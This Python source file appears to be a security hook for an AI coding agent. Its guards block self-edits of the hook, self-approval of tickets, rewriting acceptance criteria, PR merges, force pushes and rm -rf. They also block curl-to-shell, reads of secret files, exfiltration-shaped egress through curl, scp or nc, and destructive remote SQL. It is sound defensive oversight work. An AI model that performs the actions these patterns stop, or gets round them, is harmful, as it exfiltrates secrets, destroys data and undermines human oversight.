# ── payload walking (MCP tool_input is arbitrary JSON) ─────────────────────────
def _walk_items(obj, depth=0):
    """(key_or_None, value) for every node, so a guard can match on a FIELD NAME
    (acceptance criteria) or on a VALUE (a state UUID) wherever it is nested."""
    if depth > 12:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield (k if isinstance(k, str) else None), v
            for pair in _walk_items(v, depth + 1):
                yield pair
    elif isinstance(obj, (list, tuple)):
        for v in obj:
            for pair in _walk_items(v, depth + 1):
                yield pair


def _payload_strings(inp):
    return [v.strip() for _k, v in _walk_items(inp) if isinstance(v, str) and v.strip()]


_ANY_TICKET_RE = re.compile(r"^[A-Za-z][A-Za-z0-9]{0,9}-\d+$")


def _payload_ticket_ids(inp):
    """Ticket identifiers that are a WHOLE field value — `{"id": "ENG-123"}`, not
    "fixes ENG-123" inside a PR title. Prose mentions are reporting, not targets."""
    return {s.upper() for s in _payload_strings(inp) if _ANY_TICKET_RE.match(s)}


def _payload_has_value(inp, needle: str) -> bool:
    return bool(needle) and any(s == needle for s in _payload_strings(inp))


# ── tracker (MCP) write classification ────────────────────────────────────────
# Server-name agnostic on purpose: Claude Code names MCP servers however the user
# wired them (often an opaque id), so keying on "is this the Linear server" would
# be the weakest link. We key on the TOOL VERB plus self-identifying payload
# values (a configured state/label ID, or a `<teamKey>-<n>` identifier).
_MCP_NAME_RE = re.compile(r"^mcp__(?P<server>.+?)__(?P<tool>.+)$")
_TRACKER_READ_PREFIXES = ("get_", "list_", "search_", "read_", "fetch_", "describe_",
                          "extract_", "resolve_")
# Mutation vocabulary. EXTENSION POINT: add YOUR tracker MCP's mutation tools.
# Add a battery case in test_hooks.py for every entry you add.
_TRACKER_ISSUE_CREATE_TOOLS = frozenset({"create_issue", "issue_create", "add_issue"})
_TRACKER_ISSUE_WRITE_TOOLS = frozenset({
    "save_issue", "update_issue", "issue_update", "update_issue_status",
    "archive_issue", "unarchive_issue", "delete_issue",
})
# Upserts: the SAME verb creates when no target is given and updates when one is.
_TRACKER_UPSERT_TOOLS = frozenset({"save_issue"})
_TARGET_KEYS = ("id", "issueid", "issue_id", "identifier", "ticketid", "ticket_id")
_TRACKER_OTHER_WRITE_TOOLS = frozenset({
    "save_comment", "create_comment", "update_comment", "delete_comment",
    "save_document", "save_project", "save_milestone", "save_release",
    "save_release_note", "save_status_update", "delete_status_update",
    "create_issue_label", "save_diff_comment", "delete_diff_comment",
    "submit_diff_review", "resolve_diff_thread", "merge_diff",
    "create_attachment", "create_attachment_from_upload",
    "prepare_attachment_upload", "delete_attachment",
})


def _has_target_key(inp) -> bool:
    """Does the payload name an EXISTING issue at all? Deliberately independent of
    whether the value is a resolvable `<teamKey>-<n>` identifier: an opaque UUID is
    still a target, and an issue write whose target cannot be resolved to the pin
    must fail CLOSED as an update, not be waved through as a create."""
    for k, v in _walk_items(inp):
        if k and k.lower().replace("-", "_").replace("_", "") in (
                t.replace("_", "") for t in _TARGET_KEYS):
            if isinstance(v, str) and v.strip():
                return True
    return False


def _tracker_write_kind(tool, inp, cfg):
    """None | issue-create | issue-write | write — what kind of tracker mutation
    this tool call is, or None if it isn't one.

    An MCP tool whose verb we don't recognize is treated as a write when its
    payload carries a configured state/label ID or a `<teamKey>-<n>` identifier:
    an unknown verb must not be a free pass, and a payload naming the pipeline's
    own IDs is self-identifying."""
    m = _MCP_NAME_RE.match(tool or "")
    if not m:
        return None
    base = m.group("tool").lower()
    if base.startswith(_TRACKER_READ_PREFIXES):
        return None
    if base in _TRACKER_ISSUE_CREATE_TOOLS:
        return "issue-create"
    if base in _TRACKER_ISSUE_WRITE_TOOLS:
        if base in _TRACKER_UPSERT_TOOLS and not _has_target_key(inp):
            return "issue-create"        # upsert with no target = a create
        return "issue-write"
    if base in _TRACKER_OTHER_WRITE_TOOLS:
        return "write"
    lin = cfg.get("linear") or {}
    known = {_clean_id(v) for v in (lin.get("stateIds") or {}).values()}
    known |= {_clean_id(v) for v in ((lin.get("labels") or {}).get("ids") or {}).values()}
    known.discard("")
    if any(_payload_has_value(inp, k) for k in known) or _payload_ticket_ids(inp):
        return "write"
    return None


_AC_FIELDS = {"description", "descriptiondata", "acceptancecriteria", "body", "title"}


def _ac_fields_present(inp):
    hit = []
    for k, v in _walk_items(inp):
        if not k or k.lower().replace("_", "").replace("-", "") not in _AC_FIELDS:
            continue
        if (isinstance(v, str) and v.strip()) or isinstance(v, (list, dict)) and v:
            hit.append(k)
    return sorted(set(hit))


def _dor_gaps(ticket):
    """What the ticket snapshot is missing to be Ready. Derived entirely from the
    dispatcher-written pin — never from anything the session can edit."""
    gaps = []
    acs = ticket.get("acceptance_criteria")
    if not (isinstance(acs, list) and any(isinstance(a, str) and a.strip() for a in acs)):
        gaps.append("no acceptance_criteria")
    if str(ticket.get("effort") or "").strip().upper() not in ("S", "M", "L"):
        gaps.append("no effort:S|M|L")
    if not str(ticket.get("track") or "").strip():
        gaps.append("no track:*")
    if not str(ticket.get("title") or "").strip():
        gaps.append("no title")
    return gaps


# ── risk / grader paths ───────────────────────────────────────────────────────
# `.claude/hooks/**` and `.claude/settings*.json` are blocked UNCONDITIONALLY by
# self-protection above, pipeline or not — nothing here makes that mode-scoped.
# These are the ADDITIONAL paths a PINNED agent session may not touch.
GRADER_PATH_FLOOR = (".github/workflows/**", DELIVERY_FILE)


def _grader_globs(cfg):
    globs = list(GRADER_PATH_FLOOR)
    for g in ((cfg.get("autonomy") or {}).get("riskPaths") or []):
        if isinstance(g, str) and g.strip() and g.strip() not in globs:
            globs.append(g.strip())
    return globs


def _glob_to_re(pat: str) -> str:
    """git-style glob → regex over a '/'-separated repo-relative path."""
    out, i = [], 0
    while i < len(pat):
        if pat.startswith("**/", i):
            out.append(r"(?:[^/]+/)*"); i += 3
        elif pat.startswith("**", i):
            out.append(r".*"); i += 2
        elif pat[i] == "*":
            out.append(r"[^/]*"); i += 1
        elif pat[i] == "?":
            out.append(r"[^/]"); i += 1
        else:
            out.append(re.escape(pat[i])); i += 1
    return "".join(out)


def _matches_any_glob(rel: str, globs) -> bool:
    return any(re.match("^" + _glob_to_re(g) + "$", rel) for g in globs)


def _repo_rel(path: str):
    """Repo-relative POSIX path, or None when the target is outside this worktree
    (the cross-worktree guard above owns that case)."""
    if not path:
        return None
    try:
        ap = os.path.realpath(path)
        if os.path.commonpath([ap, PROJECT_ROOT]) != PROJECT_ROOT:
            return None
        return os.path.relpath(ap, PROJECT_ROOT).replace(os.sep, "/")
    except Exception:
        return None


_BASH_SEG = r"[^\s'\"|&;<>/\\]*"


def _glob_to_bash_re(pat: str) -> str:
    """The Bash-scanning twin of _glob_to_re: matches the same path shape as a
    shell TOKEN (either separator, arbitrary directory prefix). A leading `**/`
    becomes one-or-more segments, so an extension-only glob like `**/*.key`
    cannot match a bare `'.key'` in a jq filter — bare secret files are already
    covered unconditionally by the secret-path guard above. The trailing lookahead
    is the complement of the token class, so a match must END a shell token:
    without it, an extension glob matched INSIDE a longer name (`src/api.keys`)."""
    out, i = [], 0
    while i < len(pat):
        if pat.startswith("**/", i):
            out.append(r"(?:" + _BASH_SEG + r"[/\\])+"); i += 3
        elif pat.startswith("**", i):
            out.append(r"[^\s'\"|&;<>]*"); i += 2
        elif pat[i] == "*":
            out.append(_BASH_SEG); i += 1
        elif pat[i] == "?":
            out.append(r"[^\s'\"|&;<>/\\]"); i += 1
        elif pat[i] == "/":
            out.append(r"[/\\]"); i += 1
        else:
            out.append(re.escape(pat[i])); i += 1
    return (r"(?<![\w.$~/\\-])(?:[^\s'\"|&;<>]*[/\\])?" + "".join(out)
            + r"(?=[\s'\"|&;<>]|$)")


def _grader_mutate_re(globs):
    """The SAME operator scaffold self-protection uses, aimed at the grader set —
    adding a path means adding it in two places (this Bash regex and the
    Edit/Write glob set), which is why the battery carries a case for each."""
    return _mutate_re("(?:" + "|".join(_glob_to_bash_re(g) for g in globs) + ")")


def _session_changed_paths(pin, cfg):
    """Repo-relative paths this session changes vs its base — committed AND
    working-tree. Raises on any failure; the caller treats that as "a risk-path
    change cannot be ruled out" and blocks."""
    base = (pin or {}).get("base_branch") or (cfg.get("github") or {}).get("defaultBranch") or "main"
    ref = None
    for cand in (f"origin/{base}", base):
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "rev-parse", "--verify", "--quiet", cand + "^{commit}"],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode == 0:
            ref = cand
            break
    if ref is None:
        raise RuntimeError("base ref not found")
    paths = set()
    r = subprocess.run(
        ["git", "-C", PROJECT_ROOT, "diff", "--name-only", f"{ref}...HEAD"],
        capture_output=True, text=True, timeout=10,
    )
    if r.returncode != 0:
        raise RuntimeError("git diff failed")
    paths.update(p.strip() for p in r.stdout.splitlines() if p.strip())
    r = subprocess.run(
        ["git", "-C", PROJECT_ROOT, "status", "--porcelain"],
        capture_output=True, text=True, timeout=10,
    )
    if r.returncode != 0:
        raise RuntimeError("git status failed")
    for line in r.stdout.splitlines():
        if len(line) > 3:
            paths.add(line[3:].split(" -> ")[-1].strip().strip('"'))
    return {p for p in paths if p}


def _branch_ticket(branch: str):
    """The ticket segment of a branch name, or None. Lower-case by construction —
    BRANCH_NAME_RE is `[a-z0-9-]` only, so tracker IDs MUST be lower-cased in a
    branch and every comparison against a pinned ID is case-INsensitive."""
    m = BRANCH_NAME_RE.match(branch or "")
    return m.group("ticket") if m else None


# ── the guards themselves ─────────────────────────────────────────────────────
def _approval_guard(cfg, pin, ticket, pinned_id, targets):
    """State-transition / self-approval. A GRANTING check: every rung fails
    CLOSED, including the ones that fail because something could not be verified.
    A project closes the narrow allow-path entirely by dropping "epic" from
    `autonomy.autoApproveProvenance` — which is the posture
    docs/PIPELINE-CONTRACT.md §5 describes ("only out of session")."""
    auto = (cfg.get("autonomy") or {}).get("autoApproveProvenance") or []
    if "epic" not in auto:
        block(READY_HELP.format(
            why="`autonomy.autoApproveProvenance` does not list \"epic\", so no "
                "in-session approval is possible in this project."))
    if not pin or not pinned_id or not ticket:
        block(READY_HELP.format(
            why="this session has no dispatcher pin, so the ticket's provenance and "
                "definition of ready cannot be verified from anything the session "
                "did not write itself."))
    if targets != {pinned_id}:
        named = ", ".join(sorted(targets)) or "no resolvable ticket"
        block(READY_HELP.format(
            why=f"the write targets {named}, not this session's pinned ticket "
                f"{pinned_id}."))
    prov = str(ticket.get("provenance") or "").strip()
    if not re.match(r"^epic/\S+$", prov):
        block(READY_HELP.format(
            why=f"the pinned ticket's provenance is {prov or 'unset'!r}, not "
                "`epic/<ID>`."))
    gaps = _dor_gaps(ticket)
    if gaps:
        block(READY_HELP.format(
            why="the pinned ticket does not meet the definition of ready (" +
                "; ".join(gaps) + ")."))
    try:
        changed = _session_changed_paths(pin, cfg)
    except Exception as exc:
        block(READY_HELP.format(
            why=f"this session's changed-file set could not be computed "
                f"({type(exc).__name__}), so a risk-path change cannot be ruled out."))
    risky = sorted(p for p in changed if _matches_any_glob(p, _grader_globs(cfg)))
    if risky:
        block(READY_HELP.format(
            why="this session changes risk-listed paths (" + ", ".join(risky[:5]) +
                "), which always need a human."))


def _tracker_write_guards(kind, inp, cfg, pin, mode, ticket, pinned_id):
    team = str((cfg.get("linear") or {}).get("teamKey") or "").strip().upper()
    ready = _clean_id(((cfg.get("linear") or {}).get("stateIds") or {}).get("ready"))
    targets = _payload_ticket_ids(inp)
    foreign = {t for t in targets if team and not t.startswith(team + "-")}

    # ── 1. state transition into `ready` — matched by state ID, never by name ──
    if ready and _payload_has_value(inp, ready):
        _approval_guard(cfg, pin, ticket, pinned_id, targets)

    # ── 2. own-ticket-only writes ─────────────────────────────────────────────
    if mode == "ticket":
        if not pinned_id:
            block(NO_PINNED_TICKET_HELP)          # broken pin → deny every write
        if kind == "issue-create":
            block(CREATE_TICKET_HELP)
        if kind == "issue-write":
            if targets != {pinned_id}:
                if targets:
                    block(OWN_TICKET_HELP.format(
                        ticket=pinned_id, targets=", ".join(sorted(targets))))
                block(OWN_TICKET_UNRESOLVED_HELP.format(ticket=pinned_id))
        elif targets and targets != {pinned_id}:
            # Non-issue writes (comments, attachments) with an UNRESOLVABLE target
            # are deliberately allowed: comments are the contract's required
            # reporting channel (§4) and blocking them would brick every terminal
            # run. Naming someone else's ticket outright is still a block.
            block(OWN_TICKET_HELP.format(
                ticket=pinned_id, targets=", ".join(sorted(targets - {pinned_id}))))
    elif mode in ("planning", "diagnosis", "maintenance"):
        # Team-scoped, not workspace-wide — and the approval guard above still
        # applies to every one of these writes.
        if foreign:
            block(TEAM_SCOPE_HELP.format(
                team=team, mode=mode, targets=", ".join(sorted(foreign))))
    # No pin (a human's ad-hoc session in a configured repo) → this WITHHOLDING
    # check fails OPEN by design; the approval guard above already failed closed.

    # ── 3. AC integrity — no rewriting your own definition of done ────────────
    if kind == "issue-write" and pinned_id and pinned_id in targets:
        fields = _ac_fields_present(inp)
        if fields:
            block(AC_INTEGRITY_HELP.format(fields=", ".join(fields), ticket=pinned_id))


def _pipeline_guards(tool, inp) -> None:
    """Contract §2's fixed check order: existence → parse/validate → mode."""
    if not _pipeline_configured():
        return                       # OFF. Nothing that can fail runs before this.
    tool = tool or ""
    mutating = tool in ("Edit", "Write", "NotebookEdit", "Bash") or tool.startswith("mcp__")
    cfg, source = _read_delivery_config()
    if cfg is None:
        # BROKEN → fail closed, but never take the repo hostage: editing
        # `delivery.json` itself stays open so the config can be repaired
        # in-session (the bootstrap-order lesson, docs/LESSONS.md), and reads are
        # untouched so it can be diagnosed.
        if not mutating:
            return
        if tool in ("Edit", "Write", "NotebookEdit") and _repo_rel(
                inp.get("file_path", "") or inp.get("notebook_path", "")) == DELIVERY_FILE:
            return
        block(PIPELINE_BROKEN_HELP.format(source=source or DELIVERY_FILE))

    pin, pin_status, pin_file = _read_pin(cfg)
    if pin_status in ("malformed", "mismatch") and mutating:
        block(PIN_BROKEN_HELP.format(status=pin_status, path=pin_file, root=PROJECT_ROOT))

    ticket = pin.get("ticket") if (pin and isinstance(pin.get("ticket"), dict)) else None
    mode = str((pin or {}).get("session_mode") or "").strip().lower()
    pinned_id = str((ticket or {}).get("id") or "").strip().upper()

    # ── grader-path protection (scoped to PINNED agent sessions) ──────────────
    if pin:
        globs = _grader_globs(cfg)
        if tool in ("Edit", "Write", "NotebookEdit"):
            rel = _repo_rel(inp.get("file_path", "") or inp.get("notebook_path", ""))
            if rel and _matches_any_glob(rel, globs):
                block(GRADER_PATH_HELP.format(path=rel, mode=mode or "pinned"))
        if tool == "Bash" and _grader_mutate_re(globs).search(
                _strip_prose(inp.get("command", ""))):
            block(GRADER_PATH_BASH_HELP)

    # ── ticket-branch: the branch must carry the PINNED id, case-insensitively ─
    if (cfg.get("branch") or {}).get("requireTicketId") and pinned_id:
        touches_branch = (
            (tool in ("Edit", "Write") and _in_project(inp.get("file_path", "")))
            or (tool == "Bash" and re.search(
                r"\bgit\s+commit\b", _strip_prose(inp.get("command", ""))))
        )
        if touches_branch:
            branch = _current_branch()
            bt = _branch_ticket(branch)
            if branch and (not bt or bt.upper() != pinned_id):
                block(TICKET_BRANCH_HELP.format(
                    branch=branch, ticket=pinned_id.lower(),
                    suggested=f"feat/{pinned_id.lower()}-<short-kebab-desc>"))

    kind = _tracker_write_kind(tool, inp, cfg)
    if kind:
        _tracker_write_guards(kind, inp, cfg, pin, mode, ticket, pinned_id)


# ── Bash prose-stripping ──────────────────────────────────────────────────────
def _strip_prose(c: str) -> str:
    """v2 (2026-07-03 retro): guards must match OPERATIONS, not PROSE.

    Commit messages and PR titles/bodies passed inline (-m "drop stale rows")
    were false-positiving the destructive-verb patterns below. Strip quoted
    message payloads before scanning; long text via `git commit -F` /
    `--body-file` remains the norm. Message text is inert prose — it is never
    executed — so stripping it loses no protection.
    -[a-z]*m catches combined short flags too (git commit -am / -sm "msg").
    """
    return re.sub(
        r"(-[a-zA-Z]*m|--message|--title|--body|-t|-b)(\s+|=)(\"(?:[^\"\\]|\\.)*\"|'[^']*')",
        r"\1\2''",
        c,
    )


def _dispatch(data) -> None:
    """All tool guards. Runs inside the fail-closed boundary (module docstring)."""
    global PROJECT_ROOT, SELF_PROTECTED

    # Resolve the acting root from THIS payload (see _resolve_root): the anchor is
    # CLAUDE_PROJECT_DIR, widened to the cwd only for a genuine subagent worktree.
    # Done here rather than at import so the decision can read `agent_id`, and so
    # the extra `git rev-parse` runs only when a subagent is actually acting.
    PROJECT_ROOT = _resolve_root(data)
    SELF_PROTECTED = _self_protected_paths()

    tool = data.get("tool_name", "")
    inp = data.get("tool_input", {})

    # Self-protection FIRST — highest-priority block, so its message wins. Claude may
    # not edit the hook files or settings[.local].json themselves; changing them is a
    # human-only terminal step (see SELF_PROTECTED). Covers NotebookEdit too.
    if tool in ("Edit", "Write", "NotebookEdit"):
        _spp = inp.get("file_path", "") or inp.get("notebook_path", "")
        if _is_self_protected(_spp):
            block(SELF_PROTECT_HELP.format(path=os.path.abspath(_spp)))

    # Cross-worktree guard runs for ALL Edit/Write (not just in-project), and BEFORE
    # the branch guard — a write into another checkout must be caught even though it
    # is outside PROJECT_ROOT.
    if tool in ("Edit", "Write"):
        _fp = inp.get("file_path", "")
        _owner = _owning_worktree(_fp, _worktree_roots()) if _fp else None
        if _owner and _owner != PROJECT_ROOT:  # both realpath'd
            try:
                _suggested = os.path.join(
                    PROJECT_ROOT, os.path.relpath(os.path.realpath(_fp), _owner)
                )
            except Exception:
                _suggested = os.path.join(PROJECT_ROOT, "<same-relative-path>")
            block(CROSS_WORKTREE_HELP.format(owner=_owner, here=PROJECT_ROOT, suggested=_suggested))

    if tool in ("Edit", "Write") and _in_project(inp.get("file_path", "")):
        branch = _current_branch()
        if branch in PROTECTED_BRANCHES:
            block(BRANCH_HELP.format(branch=branch))
        elif branch and not BRANCH_NAME_RE.match(branch):
            block(BRANCH_NAME_HELP.format(branch=branch))

    if tool == "Bash" and re.search(r"\bgit\s+commit\b", inp.get("command", "")):
        branch = _current_branch()
        if branch in PROTECTED_BRANCHES:
            block(BRANCH_HELP.format(branch=branch))
        elif branch and not BRANCH_NAME_RE.match(branch):
            block(BRANCH_NAME_HELP.format(branch=branch))
        elif _has_upstream():
            merged = _merged_pr_info(branch)
            if merged:
                block(MERGED_PR_HELP.format(branch=branch, number=merged["number"]))

    # ── Bash ──────────────────────────────────────────────────────────────────
    if tool == "Bash":
        cmd = inp.get("command", "")
        scan = _strip_prose(cmd)

        # Self-protection: block any shell mutation of a protected hook file. First
        # guard in the Bash block so its message wins.
        if _SELF_MUTATE_RE.search(scan):
            block(SELF_PROTECT_BASH_HELP)

        # Block rm -rf / rm -fr / rm --recursive.
        # The short-flag run must START an argument token — (?:^|[\s'"]) before the
        # dash — because unanchored, interior dashes in FILENAMES matched too and
        # false-blocked plain `rm`: probe-future-date.ts (-futur ~ -f..r),
        # build-for-prod.txt (-for). Real spellings (rm -rf,
        # -fr, -irf, quoted '-rf', --recursive) still block.
        # Case-insensitive so `-Rf`/`-fR` block too, and a third arm catches the
        # flags split across separate tokens (`rm -r -f x`).
        if re.search(r"\brm\b[^#\n;&|]*(?:^|[\s'\"])-[a-z]*r[a-z]*f", scan, re.I) or \
           re.search(r"\brm\b[^#\n;&|]*(?:^|[\s'\"])-[a-z]*f[a-z]*r", scan, re.I) or \
           re.search(r"\brm\b[^#\n;&|]*--recursive", scan) or \
           (re.search(r"\brm\b[^#\n;&|]*(?:^|[\s'\"])-[a-z]*r", scan, re.I) and
            re.search(r"\brm\b[^#\n;&|]*(?:^|[\s'\"])-[a-z]*f", scan, re.I)):
            block(
                "rm -rf / rm --recursive detected — use specific paths or ask the user to confirm."
            )

        # Block curl/wget piped directly to a shell
        if re.search(
            r"(curl|wget)\s[^|\n]*\|\s*(bash|sh|zsh|fish|python3?|ruby|perl)", scan
        ):
            block(
                "Piping curl/wget into a shell is a supply-chain risk. "
                "Download first, inspect, then run."
            )

        # Block staging reference dirs or real .env files.
        # `planning/` is this kit's default name for a gitignored reference-material
        # dir (licensed specs, exports, scratch notes). If your project names it
        # differently, update this pattern AND .gitignore AND .husky/pre-commit AND
        # the app CI's forbidden-paths grep together — every layer must agree.
        if re.search(r"\bgit\s+add\b[^#\n;&|]*(planning/|\.env(?!\.example))", scan):
            block(
                "Staging planning/ or .env files is forbidden — "
                "these paths are gitignored to prevent leaks."
            )

        # Push guard v2 (2026-07-03 retro): protect main/master from ANY
        # push; elsewhere allow the safe `--force-with-lease` (refuses to clobber
        # unseen remote commits) but block bare `--force`/`-f`. GitHub branch
        # protection is the server-side backstop for anything this heuristic misses.
        _push = re.search(r"\bgit\s+push\b([^#\n;&|]*)", scan)
        if _push:
            _seg = _push.group(1)
            if re.search(r"[\s:](main|master)(?![\w./-])", _seg):
                block("Pushing to main/master is not allowed. Use a feature branch + PR.")
            if re.search(r"(^|\s)--force(?!-with-lease\b)\b", _seg) or re.search(
                r"(^|\s)-f\b", _seg
            ):
                block(
                    "Bare --force/-f push is blocked — use `git push --force-with-lease`, "
                    "which refuses to overwrite remote commits you haven't seen."
                )
            branch = _current_branch()
            if branch not in PROTECTED_BRANCHES and _has_upstream():
                merged = _merged_pr_info(branch)
                if merged:
                    block(MERGED_PR_HELP.format(branch=branch, number=merged["number"]))

        # Merging a PR (with or without --auto) is the HUMAN's action only — Claude
        # opens PRs and stops there (near-miss 2026-07-03: `gh pr merge
        # --auto` was briefly used on Claude-opened PRs before being corrected;
        # auto-merge still means the agent caused the merge). `--disable-auto` is
        # exempted since it only *undoes* an auto-merge, never causes one.
        _gh_merge = re.search(r"\bgh\s+pr\s+merge\b([^#\n;&|]*)", scan)
        if _gh_merge and "--disable-auto" not in _gh_merge.group(1):
            block(
                "`gh pr merge` (including --auto) is not allowed — merging PRs is "
                "the human's action only. Open the PR (`gh pr create`) and stop "
                "there. (`gh pr merge --disable-auto` is still allowed, to undo an "
                "auto-merge that shouldn't have been enabled.)"
            )

        # ── Secret-file read/source guard — path target, not reader verbs ──────
        # (see SENSITIVE_PATH_RE above; deliberately whole-command, so a secret
        # path in a LATER chained command still blocks.)
        if SENSITIVE_PATH_RE.search(scan):
            block(
                "This command references a secret file (.env / *.pem / *.key / "
                "id_rsa / credentials). Reading, sourcing, or dumping secrets into "
                "the shell is not allowed — reference values by env-var NAME only. "
                "(.env.example is fine.)"
            )

        # ── Egress / exfiltration guard (see EGRESS_ALLOW_SUFFIXES above) ──────
        if NET_TOOL_RE.search(scan):
            unknown = sorted({h for h in _egress_hosts(scan) if not _host_allowlisted(h)})
            if unknown:
                exfil_shape = (
                    re.search(r"(?<![\w-])(?:-d|--data|--data-\w+|--post-\w+|-F|--form|-T|--upload-file)(?![\w-])", scan)
                    or re.search(r"(?<![\w-])-X\s*(?:POST|PUT|PATCH)(?![\w-])", scan, re.IGNORECASE)
                    or re.search(r"[=\s]@[\w./~+-]+", scan)  # curl @file payload
                    # $VAR spliced into the URL's QUERY/FRAGMENT — where a spliced
                    # secret actually rides. Deliberately not "any $ in the URL":
                    # that blocked ordinary versioned downloads such as
                    # `curl -O https://dl.example.com/${VERSION}/pkg.tgz`.
                    or re.search(r"://[^\s'\"]*[?&#][^\s'\"]*\$", scan)
                    or re.search(r"(?<![\w-])(?:scp|sftp|nc|ncat|netcat)(?![\w-])", scan)  # inherently outbound
                )
                if exfil_shape:
                    block(
                        "Egress blocked — a network tool is targeting a non-allowlisted "
                        "host ({hosts}) with an upload/data flag, an @file payload, a "
                        "$var-in-URL, or a raw socket/scp push. This is the shape of "
                        "data exfiltration. Allowed hosts: localhost, *.github.com, "
                        "*.githubusercontent.com, *.anthropic.com, *.npmjs.org (plus "
                        "any stack-specific entries). Plain downloads from a trusted "
                        "host are fine.".format(hosts=", ".join(unknown))
                    )

    # ── Read ──────────────────────────────────────────────────────────────────
    if tool == "Read":
        path = inp.get("file_path", "")
        basename = os.path.basename(path)

        if re.match(r"^\.env", basename) and not basename.endswith(".example"):
            block(
                f"Reading {basename} is blocked — it may contain real secrets. "
                "Reference env vars by name only."
            )
        if re.search(r"\.(pem|key)$", basename):
            block(f"Reading {basename} is blocked — private key files are off-limits.")
        if SENSITIVE_BASENAME_RE.search(basename):
            block(
                f"Reading {basename} is blocked — SSH keys and cloud credential "
                "files are off-limits. Reference secrets by env-var name only."
            )

    # ── Edit / Write ──────────────────────────────────────────────────────────
    if tool in ("Edit", "Write"):
        path = inp.get("file_path", "")
        basename = os.path.basename(path)

        # Block writing to real .env files
        if re.match(r"^\.env", basename) and not basename.endswith(".example"):
            block(
                f"Writing to {basename} is blocked. "
                "Only .env.example (with placeholder values) is committed."
            )
        # Block writing SSH-key / cloud-credential files
        if SENSITIVE_BASENAME_RE.search(basename):
            block(
                f"Writing {basename} is blocked — SSH keys and cloud credential "
                "files are human-managed; Claude never creates or edits them."
            )

        # Block embedding secret values in any file content
        content = inp.get("new_string", "") or inp.get("content", "")
        SECRET_PATTERNS = [
            (r"sk-ant-[a-zA-Z0-9\-_]{20,}", "Anthropic API key (sk-ant-…)"),
            (r"(?:supabase|postgres)://[^:@\s]+:[^@\s]{8,}@", "DB connection string with password"),
            (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "Private key block"),
            (r"(?:AKID|AKIA)[A-Z0-9]{16}", "AWS access key"),
            (r"gh[pousr]_[A-Za-z0-9_]{36,}", "GitHub personal access token"),
            (r"eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}", "JWT token value"),
            # Extension point: add patterns for providers YOUR project uses, e.g.
            # OpenAI-style keys: (r"sk-[a-zA-Z0-9]{32,}", "OpenAI-style API key").
            # Add a battery case in test_hooks.py for every pattern you add.
        ]
        for pattern, label in SECRET_PATTERNS:
            if re.search(pattern, content):
                block(
                    f"Secret value pattern detected in file content ({label}). "
                    "Reference secrets by env var name only — never embed values."
                )

    # ════════════════════════════════════════════════════════════════════════
    # 2. STACK-SPECIFIC GUARDS — Supabase / Postgres
    #    Replace this section for your datastore. Keep the shape: the LOCAL
    #    (disposable) instance stays unguarded so routine resets are
    #    frictionless; the REMOTE (irreplaceable) instance gets hard blocks on
    #    destructive ops.
    # ════════════════════════════════════════════════════════════════════════
    if tool == "Bash":
        scan = _strip_prose(inp.get("command", ""))

        # `supabase db reset` wipes the database. Local (Docker) is fine; --linked /
        # --db-url target a REMOTE db and would destroy it.
        if re.search(r"\bsupabase\b[^#\n]*\bdb\s+reset\b", scan) and \
           re.search(r"--linked\b|--db-url\b", scan):
            block(
                "`supabase db reset` against a linked/remote database wipes it. "
                "Only the local (Docker) reset is allowed; change prod via reviewed, "
                "reversible migrations."
            )

        # Deleting a hosted Supabase project is irreversible.
        if re.search(r"\bsupabase\b[^#\n]*\bprojects?\s+delete\b", scan):
            block("`supabase projects delete` is irreversible and is not allowed.")

        # Raw destructive SQL (DROP / TRUNCATE / DELETE) aimed at a NON-localhost
        # Postgres host — e.g. psql against a remote connection string. A postgres
        # URL whose host is not localhost/127.0.0.1 alongside a destructive verb
        # is blocked.
        if re.search(r"\b(drop|truncate|delete)\b", scan, re.IGNORECASE) and re.search(
            r"postgres(?:ql)?://[^\s'\"]*@(?!(?:localhost|127\.0\.0\.1|0\.0\.0\.0))",
            scan,
            re.IGNORECASE,
        ):
            block(
                "Destructive SQL (DROP/TRUNCATE/DELETE) against a remote database is "
                "blocked. Run destructive changes only on the local DB, via migrations."
            )

    # ═════════════════════════════════════════════════════════════════════════
    # 1b. PIPELINE GUARDS — LAST, so every universal guard's message wins over
    #     a pipeline one, and so the whole section is a single no-op `stat` for
    #     the projects (most of them) that never adopted the pipeline.
    # ═════════════════════════════════════════════════════════════════════════
    _pipeline_guards(tool, inp)


# ── Entry point ───────────────────────────────────────────────────────────────
try:
    data = json.load(sys.stdin)
except Exception:
    # Fail-open on malformed input: a broken harness payload must not brick
    # every tool call (the harness — not the model — builds this stdin). The
    # battery asserts this behavior (case "garbage stdin").
    sys.exit(0)

# Fail CLOSED on internal errors: Claude Code treats a
# non-2 nonzero exit as NON-blocking — the tool would run. If a security matcher
# raises on a crafted/unexpected tool_input, block instead of crashing to exit 1.
# The workflow guards inside swallow their own errors (fail-open by design), so
# only genuine security-check failures reach here.
try:
    _dispatch(data)
except SystemExit:
    raise  # an explicit allow/deny already decided
except Exception as exc:
    print(
        f"[Security Hook] internal error — failing closed ({type(exc).__name__})",
        file=sys.stderr,
    )
    sys.exit(2)

sys.exit(0)
